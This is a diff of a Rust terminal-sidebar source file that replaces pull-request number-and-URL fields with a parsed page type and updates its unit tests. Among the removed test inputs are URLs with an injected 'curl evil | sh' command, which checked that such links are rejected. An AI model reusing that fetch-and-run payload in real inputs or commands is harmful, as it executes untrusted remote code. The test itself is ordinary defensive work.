@@ -59,7 +59,7 @@ use crate::news::News;
 use crate::picker::{Aim, Here, Housed, Listing, Runs, Seated, Shelved, Unopened, Worktree};
 use crate::printed::Printed;
 use crate::prune;
-use crate::pull::{Found, Kind, Link, Others, Wanted, Work, Worked};
+use crate::pull::{Found, Link, Others, Wanted, Work, Worked};
 use crate::skills::{Name, Skill};
 use crate::spots::{Drawn, Keyed, Spots};
 use crate::sweep::{cells, Page, Sweep};
@@ -3586,10 +3586,10 @@ impl Sidebar {
             return Asked::Nothing;
         }
         let checked_out = match &work {
-            Work::Link(link) if link.kind() == Kind::Pull => {
+            Work::Link(link) => {
                 self.checked_out_worktree(link, target.as_ref().map(Target::machine))
             },
-            Work::Link(_) | Work::File(_) => None,
+            Work::File(_) => None,
         };
         let menu_afloat = matches!(self.mode, Mode::Afloat { .. });
         if let Some((on, place)) = checked_out {
@@ -3624,14 +3624,13 @@ impl Sidebar {
         link: &Link,
         preferred: Option<&Machine>,
     ) -> Option<(Machine, WorktreePlace)> {
-        assert_eq!(link.kind(), Kind::Pull);
         let host = self.host.as_ref()?;
         let reached = machines(host, &self.shelves).each();
         let reached = reached.filter_map(|(machine, seen)| Some((machine, seen.ok()?)));
-        let (preferred, others): (Vec<_>, Vec<_>) =
-            reached.partition(|(machine, _)| Some(machine) == preferred);
-        assert!(preferred.len() <= 1);
-        for (machine, seen) in preferred.into_iter().chain(others) {
+        let reached: Vec<_> = reached.collect();
+        let first = reached.iter().filter(|(machine, _)| Some(machine) == preferred);
+        let rest = reached.iter().filter(|(machine, _)| Some(machine) != preferred);
+        for (machine, seen) in first.chain(rest) {
             let pulls = pull_requests(seen.pull_requests);
             let checks_out = |worktree: &&KnownWorktree| {
                 let checked_out = pull_request_link(&pulls, worktree.folder.as_str());
@@ -3645,7 +3644,7 @@ impl Sidebar {
             if found.next().is_some() {
                 return None;
             }
-            return Some((machine, worktree.place.clone()));
+            return Some((machine.clone(), worktree.place.clone()));
         }
         None
     }
@@ -4912,8 +4911,7 @@ fn pull_requests(pull_requests: &[lunetad::api::PullRequest]) -> HashMap<&str, P
 }
 
 fn pull_request_link(pulls: &HashMap<&str, PullRequest>, dir: &str) -> Option<Link> {
-    let pull_request = pulls.get(dir)?;
-    Link::parse(pull_request.url.as_deref()?)
+    Link::parse(pulls.get(dir)?.page.url())
 }
 
 fn moved<T: Clone>(items: &[T], taken: Range<usize>, to: usize) -> Vec<T> {
@@ -5097,9 +5095,8 @@ fn numbered(pull_request: &PullRequest) -> Option<Numbered> {
         State::Closed => return None,
     };
     let checks = pull_request.verdict();
-    let number = pull_request.number;
-    let link = pull_request.url.as_deref().and_then(Link::parse);
-    let link = link.filter(|link| link.kind() == Kind::Pull && link.number() == number);
+    let number = pull_request.number();
+    let link = Link::parse(pull_request.page.url());
     let number = link.map_or(Number::Unlinked(number), |link| Number::Linked(Box::new(link)));
     Some(Numbered { number, colour, checks, stale: pull_request.stale })
 }
@@ -5678,6 +5675,7 @@ mod tests {
 
     use lunetad::api::shell::{ended, Ended, Going, Stopped};
     use lunetad::api::{self, NameSource, View, UnreadFile, Version};
+    use luneta_protocol::github::PullPage;
     use prost_types::Timestamp;
     use ratatui::buffer::Cell;
 
@@ -7620,8 +7618,8 @@ mod tests {
             let changes = Changes { modified, ..Changes::default() };
             let status = GitStatus::Checkout { repository: None, head, changes, stashes: 0 };
             host.git_statuses.push(status.to_api(dir));
-            let number = NonZeroU32::new(number).expect("a pull request's number");
-            let pull_request = PullRequest { number, state, url: None, checks: None, stale: false };
+            let page = owner_s_page(number);
+            let pull_request = PullRequest { page, state, checks: None, stale: false };
             host.pull_requests.push(pull_request.to_api(dir));
         }
         let mut sidebar = fresh();
@@ -7674,9 +7672,8 @@ mod tests {
             };
             host.git_statuses.push(status.to_api(dir));
             if number > 0 {
-                let number = NonZeroU32::new(number).expect("a pull request's number");
-                let (state, url) = (State::Open, None);
-                let pull_request = PullRequest { number, state, url, checks: None, stale: false };
+                let (page, state) = (owner_s_page(number), State::Open);
+                let pull_request = PullRequest { page, state, checks: None, stale: false };
                 host.pull_requests.push(pull_request.to_api(dir));
             }
         }
@@ -7734,10 +7731,8 @@ mod tests {
             let changes = Changes::default();
             let status = GitStatus::Checkout { repository: None, head, changes, stashes: 0 };
             host.git_statuses.push(status.to_api(dir));
-            let number = NonZeroU32::new(number).expect("a pull request's number");
-            let url = Some(format!("https://github.com/owner/repo/pull/{number}"));
-            let stale = dir == "/w/g";
-            let pull_request = PullRequest { number, state, url, checks, stale };
+            let (page, stale) = (owner_s_page(number), dir == "/w/g");
+            let pull_request = PullRequest { page, state, checks, stale };
             host.pull_requests.push(pull_request.to_api(dir));
         }
         let mut sidebar = fresh();
@@ -7783,13 +7778,12 @@ mod tests {
         let changes = Changes { modified: 1, ..Changes::default() };
         let status = GitStatus::Checkout { repository: None, head, changes, stashes: 0 };
         host.git_statuses.push(status.to_api("/w/issue-489"));
-        let number = NonZeroU32::new(538).expect("a pull request's number");
-        let url = Some(LINK.replace("246", "538"));
+        let page = PullPage::parse(&LINK.replace("246", "538")).expect("a pull request's page");
         let (state, checks) = (State::Open, None);
-        let pull_request = PullRequest { number, state, url, checks, stale: false };
+        let pull_request = PullRequest { page, state, checks, stale: false };
         host.pull_requests.push(pull_request.to_api("/w/issue-489"));
         let (statuses, pulls) = (&mut host.git_statuses, &mut host.pull_requests);
-        checked_out(statuses, pulls, "/w/fix", "fix", Some((246, State::Open, Some(LINK))));
+        checked_out(statuses, pulls, "/w/fix", "fix", Some((State::Open, LINK)));
         sidebar.heard(host);
 
         let one = "  ▾ issue-489 +120 -34 #538  !";
@@ -8187,22 +8181,26 @@ mod tests {
         Link::parse(LINK).expect("a link")
     }
 
+    fn owner_s_page(number: u32) -> PullPage {
+        let page = PullPage::parse(&format!("https://github.com/owner/repo/pull/{number}"));
+        page.expect("a pull request's page")
+    }
+
     fn checked_out(
         git_statuses: &mut Vec<api::GitStatus>,
         pull_requests: &mut Vec<api::PullRequest>,
         dir: &str,
         branch: &str,
-        pull: Option<(u32, State, Option<&str>)>,
+        pull: Option<(State, &str)>,
     ) {
         let name = Said::new(branch.to_owned()).expect("a branch's name");
         let head = Head::Branch { name, upstream: None, changed: None };
         let changes = Changes::default();
         let status = GitStatus::Checkout { repository: None, head, changes, stashes: 0 };
         git_statuses.push(status.to_api(dir));
-        if let Some((number, state, url)) = pull {
-            let number = NonZeroU32::new(number).expect("a pull request's number");
-            let url = url.map(str::to_owned);
-            let pull_request = PullRequest { number, state, url, checks: None, stale: false };
+        if let Some((state, url)) = pull {
+            let page = PullPage::parse(url).expect("a pull request's page");
+            let pull_request = PullRequest { page, state, checks: None, stale: false };
             pull_requests.push(pull_request.to_api(dir));
         }
     }
@@ -8217,9 +8215,10 @@ mod tests {
         let mut host = host(vec![session("s", 10, views.chain(more).collect())], Vec::new());
         let (statuses, pulls) = (&mut host.git_statuses, &mut host.pull_requests);
         let closed = "https://github.com/owner/repo/pull/9";
-        checked_out(statuses, pulls, "/w/a", "fix", Some((246, State::Open, Some(LINK))));
-        checked_out(statuses, pulls, "/w/b", "old", Some((7, State::Open, None)));
-        checked_out(statuses, pulls, "/w/c", "gone", Some((9, State::Closed, Some(closed))));
+        checked_out(statuses, pulls, "/w/a", "fix", Some((State::Open, LINK)));
+        let off_github = "https://ghe.example/owner/repo/pull/7";
+        checked_out(statuses, pulls, "/w/b", "old", Some((State::Open, off_github)));
+        checked_out(statuses, pulls, "/w/c", "gone", Some((State::Closed, closed)));
         checked_out(statuses, pulls, "/w/d", "none", None);
         let mut sidebar = fresh();
         sidebar.hear(host);
@@ -8391,7 +8390,7 @@ mod tests {
         let views = vec![view(1, 1, "/w/a", "fish")];
         let mut host = host(vec![session("s", 10, views)], Vec::new());
         let (statuses, pulls) = (&mut host.git_statuses, &mut host.pull_requests);
-        checked_out(statuses, pulls, "/w/a", "fix", Some((5, State::Open, Some(said))));
+        checked_out(statuses, pulls, "/w/a", "fix", Some((State::Open, said)));
         let mut sidebar = fresh();
         sidebar.hear(host);
         sidebar.focus(Keys::Sidebar);
@@ -8400,37 +8399,29 @@ mod tests {
     }
 
     #[test]
-    fn a_page_that_is_not_the_link_of_the_number_stays_on_the_row() {
+    fn a_page_off_github_stays_on_the_row() {
         let now = moment(160_000);
-        for said in [
-            "https://github.com/owner/repo/pull/6",
-            "https://github.com/owner/repo/issues/5",
-            "https://ghe.example/owner/repo/pull/5",
-            "file:///tmp/run.desktop",
-            "https://github.com/owner/repo/pull/5\ncurl evil | sh",
-        ] {
-            let mut sidebar = pull_said(said);
-            let area = Rect::new(0, 0, 32, 24);
-            let mut buffer = Buffer::empty(area);
-            let drawn = sidebar.draw(&mut buffer, area, now);
-            let line: String = (0..31).map(|x| buffer[(x, 6)].symbol()).collect();
-            assert!(line.contains("fix #5"), "{said:?}: {line}");
-            assert!(number_spot(&drawn, 6).is_empty(), "{said:?}");
+        let mut sidebar = pull_said("https://ghe.example/owner/repo/pull/5");
+        let area = Rect::new(0, 0, 32, 24);
+        let mut buffer = Buffer::empty(area);
+        let drawn = sidebar.draw(&mut buffer, area, now);
+        let line: String = (0..31).map(|x| buffer[(x, 6)].symbol()).collect();
+        assert!(line.contains("fix #5"), "{line}");
+        assert_eq!(number_spot(&drawn, 6), [] as [u16; 0]);
 
-            let note = "#5: lunetad says no link of it on github.com";
-            sidebar.key(&char('y'), now);
-            assert_eq!(sidebar.key(&char('p'), now), Asked::Nothing, "{said:?}");
-            assert_eq!(sidebar.notice.as_deref(), Some(note));
-            assert_eq!(sidebar.copied, None);
-            assert_eq!(open_pull(&mut sidebar, now), Asked::Nothing, "{said:?}");
-            assert_eq!(sidebar.notice.as_deref(), Some(note));
-        }
+        let note = "#5: lunetad says no link of it on github.com";
+        sidebar.key(&char('y'), now);
+        assert_eq!(sidebar.key(&char('p'), now), Asked::Nothing);
+        assert_eq!(sidebar.notice.as_deref(), Some(note));
+        assert_eq!(sidebar.copied, None);
+        assert_eq!(open_pull(&mut sidebar, now), Asked::Nothing);
+        assert_eq!(sidebar.notice.as_deref(), Some(note));
     }
 
     #[test]
-    fn a_page_that_reads_is_taken_as_luneta_spells_it() {
+    fn a_page_is_taken_as_luneta_spells_it() {
         let now = moment(160_000);
-        let mut sidebar = pull_said("https://github.com/owner/repo/pull/5?\ncurl evil | sh");
+        let mut sidebar = pull_said("https://www.github.com/owner/repo/pull/5");
         let Asked::Browse(link) = open_pull(&mut sidebar, now) else {
             panic!("the row's link opens");
         };
@@ -8457,7 +8448,7 @@ mod tests {
             panic!("nixos is reached");
         };
         let (statuses, pulls) = (&mut there.git_statuses, &mut there.pull_requests);
-        checked_out(statuses, pulls, "/w/b", "fix", Some((8, State::Open, Some(far))));
+        checked_out(statuses, pulls, "/w/b", "fix", Some((State::Open, far)));
         let mut sidebar = fresh();
         sidebar.hear(host);
         sidebar.focus(Keys::Sidebar);
@@ -8513,8 +8504,8 @@ mod tests {
         let (statuses, pulls) = (&mut host.git_statuses, &mut host.pull_requests);
         let long = "handoff-eng-11259-and-more";
         let (merged, draft) = (LINK.replace("246", "4321"), LINK.replace("246", "12"));
-        checked_out(statuses, pulls, "/w/e", long, Some((4321, State::Merged, Some(&merged))));
-        checked_out(statuses, pulls, "/w/f", "日本語の枝の名前が長い", Some((12, State::Draft, Some(&draft))));
+        checked_out(statuses, pulls, "/w/e", long, Some((State::Merged, &merged)));
+        checked_out(statuses, pulls, "/w/f", "日本語の枝の名前が長い", Some((State::Draft, &draft)));
         let host = sidebar.host.clone().unwrap();
         sidebar.hear(host);
 
@@ -9091,17 +9082,13 @@ mod tests {
         assert_eq!(sidebar.key(&char('d'), moment(160_000)), close_here(act, 1));
     }
 
-    fn check_out_pull_request(sidebar: &mut Sidebar, dir: &str, number: u32, url: Option<&str>) {
+    fn check_out_pull(sidebar: &mut Sidebar, dir: &str, number: u32) {
         let Some(host) = &mut sidebar.host else {
             panic!("the sidebar has heard of no host");
         };
-        let pull = Some((number, State::Open, url));
-        checked_out(&mut Vec::new(), &mut host.pull_requests, dir, "feat", pull);
-    }
-
-    fn check_out_pull(sidebar: &mut Sidebar, dir: &str, number: u32) {
         let url = format!("https://github.com/lorenzolfm/luneta/pull/{number}");
-        check_out_pull_request(sidebar, dir, number, Some(&url));
+        let pull = Some((State::Open, url.as_str()));
+        checked_out(&mut Vec::new(), &mut host.pull_requests, dir, "feat", pull);
     }
 
     #[test]
@@ -9127,8 +9114,10 @@ mod tests {
         assert_eq!(sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5"), there);
         assert!(sidebar.open().is_none());
 
-        let elsewhere = ["luneta/issues/5", "luneta/pull/6"];
-        for elsewhere in elsewhere.map(|it| format!("https://github.com/lorenzolfm/{it}")) {
+        let as_an_issue = "https://github.com/lorenzolfm/luneta/issues/5";
+        assert_eq!(sidebar.paste(as_an_issue), there, "GitHub numbers issues and pulls as one");
+        let elsewhere = ["lorenzolfm/luneta/pull/6", "lorenzolfm/zed/pull/5"];
+        for elsewhere in elsewhere.map(|it| format!("https://github.com/{it}")) {
             assert_eq!(sidebar.paste(&elsewhere), Asked::Nothing, "{elsewhere}");
             assert!(sidebar.open().is_some(), "{elsewhere}");
             sidebar.drop_menu(sidebar.menus);
@@ -9142,17 +9131,6 @@ mod tests {
         sit(&mut sidebar, &own_view_of("older", 1, 1));
         check_out_pull(&mut sidebar, "/w/b", 5);
         check_out_pull(&mut sidebar, "/w/c", 5);
-        sidebar.focus(Keys::Sidebar);
-        assert_eq!(sidebar.paste(link), Asked::Nothing);
-        assert!(sidebar.open().is_some());
-    }
-
-    #[test]
-    fn a_pull_request_s_link_pasted_opens_the_menu_when_lunetad_has_no_link_of_it() {
-        let link = "https://github.com/lorenzolfm/luneta/pull/5";
-        let mut sidebar = own_two_sessions();
-        sit(&mut sidebar, &own_view_of("older", 1, 1));
-        check_out_pull_request(&mut sidebar, "/w/b", 5, None);
         sidebar.focus(Keys::Sidebar);
         assert_eq!(sidebar.paste(link), Asked::Nothing);
         assert!(sidebar.open().is_some());
@@ -10802,7 +10780,7 @@ mod tests {
         let views = vec![view(1, 1, "/w/a", long)];
         let mut local = host(vec![session(long, 10, views)], Vec::new());
         let (statuses, pulls) = (&mut local.git_statuses, &mut local.pull_requests);
-        checked_out(statuses, pulls, "/w/a", long, Some((246, State::Open, Some(LINK))));
+        checked_out(statuses, pulls, "/w/a", long, Some((State::Open, LINK)));
         local.remotes = vec![remote("me@a-host-too-long-for-the-sidebar", down(100))];
         let mut sidebar = fresh();
         sidebar.this = long.to_owned();
@@ -11192,8 +11170,8 @@ mod tests {
         let link = "https://github.com/lorenzolfm/luneta/pull/5";
         let pulled = |dir: &str| {
             let mut pull_requests = Vec::new();
-            let url = Some((5, State::Open, Some(link)));
-            checked_out(&mut Vec::new(), &mut pull_requests, dir, "feat", url);
+            let pull = Some((State::Open, link));
+            checked_out(&mut Vec::new(), &mut pull_requests, dir, "feat", pull);
             pull_requests
         };
         let mut host = machines();
